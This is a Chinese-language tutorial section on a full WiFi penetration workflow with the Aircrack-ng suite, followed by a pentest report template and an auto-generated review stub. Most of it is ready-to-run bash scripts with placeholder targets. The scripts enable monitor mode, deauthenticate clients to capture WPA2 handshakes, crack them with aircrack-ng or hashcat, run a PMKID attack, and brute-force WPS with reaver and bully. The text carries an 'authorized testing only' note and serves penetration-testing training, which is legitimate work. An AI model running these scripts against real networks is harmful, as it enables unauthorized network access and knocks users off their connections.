# 实战案例：Aircrack-ng 套件完整 WiFi 渗透流程

### 5.1 环境准备

```bash
#!/bin/bash
# WiFi 渗透测试环境准备脚本
# 注意：仅用于授权测试

# 1. 确认无线网卡支持监听模式和注入
iw phy phy0 info | grep -A 10 "monitor"
iw phy phy0 info | grep -A 10 "inject"

# 2. 安装必要工具
apt update
apt install -y aircrack-ng wireshark reaver bully hashcat

# 3. 确认无线网卡芯片
lsusb | grep -i wireless
iwconfig

# 4. 终止可能冲突的进程
airmon-ng check kill

# 5. 启用监听模式
airmon-ng start wlan0
# 确认监听接口已创建
iwconfig wlan0mon
```

### 5.2 完整渗透流程

```bash
#!/bin/bash
# 完整 WiFi 渗透测试流程
# 目标: WPA2-PSK 网络
# ============================================

# 阶段1: 侦察扫描
echo "=== 阶段1: 网络扫描 ==="
# 扫描所有可见网络
timeout 30 airodump-ng wlan0mon \
  --write-interval 1 \
  --output-format csv \
  -w /tmp/scan_results

# 分析扫描结果，选择目标
echo "扫描结果保存在 /tmp/scan_results-01.csv"
echo "请选择目标 AP 的 BSSID 和信道"

# 设置目标参数（示例值）
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
TARGET_SSID="TargetNetwork"
CLIENT_MAC="00:11:22:33:44:55"

# 阶段2: 针对性监听
echo "=== 阶段2: 针对性监听 ==="
airodump-ng -c $TARGET_CHANNEL \
  --bssid $TARGET_BSSID \
  -w /tmp/target_capture \
  --output-format pcap \
  wlan0mon &

AIRODUMP_PID=$!
sleep 5

# 阶段3: 获取握手包
echo "=== 阶段3: 获取握手包 ==="
# 方法A: 等待客户端自然连接
echo "等待自然握手包..."

# 方法B: 主动 Deauth 加速
echo "执行 Deauth 攻击..."
aireplay-ng -0 5 \
  -a $TARGET_BSSID \
  -c $CLIENT_MAC \
  wlan0mon

# 检查是否捕获到握手包
sleep 10
if grep -q "WPA handshake" /tmp/target_capture-01.csv; then
    echo "[+] 握手包捕获成功！"
else
    echo "[-] 未捕获到握手包，重试..."
    aireplay-ng -0 10 \
      -a $TARGET_BSSID \
      -c $CLIENT_MAC \
      wlan0mon
    sleep 10
fi

# 停止 airodump-ng
kill $AIRODUMP_PID

# 阶段4: 离线破解
echo "=== 阶段4: 离线密码破解 ==="

# 方法A: aircrack-ng + 字典
echo "使用 aircrack-ng 破解..."
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b $TARGET_BSSID \
  /tmp/target_capture-01.cap

# 方法B: 转换为 hashcat 格式（GPU 加速）
echo "转换为 hashcat 格式..."
aircrack-ng -J /tmp/hash /tmp/target_capture-01.cap
# 使用 hashcat 破解
hashcat -m 2500 /tmp/hash.hccapx /usr/share/wordlists/rockyou.txt

# 方法C: 使用 PMKID（如果目标支持）
echo "尝试 PMKID 攻击..."
hcxdumptool -i wlan0mon \
  --filterlist_ap=$TARGET_BSSID \
  --enable_status=1 \
  -o /tmp/pmkid.pcapng \
  --active_assoc

hcxpcaptool -z /tmp/pmkid_hash.txt /tmp/pmkid.pcapng
if [ -s /tmp/pmkid_hash.txt ]; then
    echo "[+] PMKID 获取成功"
    hashcat -m 16800 /tmp/pmkid_hash.txt /usr/share/wordlists/rockyou.txt
fi

echo "=== 渗透测试完成 ==="
```

### 5.3 WPS 攻击实战

```bash
#!/bin/bash
# WPS 攻击实战脚本
# ============================================

TARGET_BSSID="AA:BB:CC:DD:EE:FF"

# 方法1: Pixie Dust 攻击（不需要客户端）
echo "=== Pixie Dust WPS 攻击 ==="
reaver -i wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -K 1 \
  -vv \
  --pixie-dust

# 或使用 bully
bully wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -d \
  -v 3

# 方法2: 在线 PIN 爆破
echo "=== WPS PIN 在线爆破 ==="
reaver -i wlan0mon \
  -b $TARGET_BSSID \
  -c 6 \
  -vv \
  --pin=12345670  # 已知 PIN 或空爆破

# 注意事项：
# - Pixie Dust 攻击成功率约 20-30%
# - 在线爆破可能需要数小时
# - 部分 AP 有 WPS 锁定机制
# - 检测 WPS 锁定状态:
reaver -i wlan0mon -b $TARGET_BSSID -c 6 --scan
```

### 5.4 完整渗透报告模板

```
无线网络渗透测试报告

1. 执行摘要
   测试时间: 2026-09-XX
   测试范围: XX 公司办公区 WiFi 网络
   总体风险等级: [高/中/低]
   关键发现:
   - 发现 X 个安全漏洞
   - X 个高危漏洞
   - X 个中危漏洞
   - 建议: [关键改进建议]

2. 测试范围
   - 目标 SSID: [列表]
   - 物理范围: [区域描述]
   - 测试时间: [日期时间]
   - 授权文件: [引用]

3. 发现详情

   3.1 [漏洞名称]
   风险等级: 高
   描述: [详细描述]
   证据: [截图/日志]
   影响: [安全影响分析]
   复现步骤:
   1. [步骤1]
   2. [步骤2]
   3. [步骤3]
   修复建议: [具体修复方案]
   参考资料: [CVE/标准引用]

4. 修复优先级
   优先级1（立即修复）:
   - [高危漏洞列表]
   
   优先级2（30天内修复）:
   - [中危漏洞列表]
   
   优先级3（长期改进）:
   - [低危/建议项]

5. 附录
   - 测试工具版本
   - 完整扫描结果
   - 证据材料
```

---

---

## 📋 内容审核与补充建议

> 针对「实战案例：Aircrack-ng 套件完整 WiFi 渗透流程」部分的内容审核结果：

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
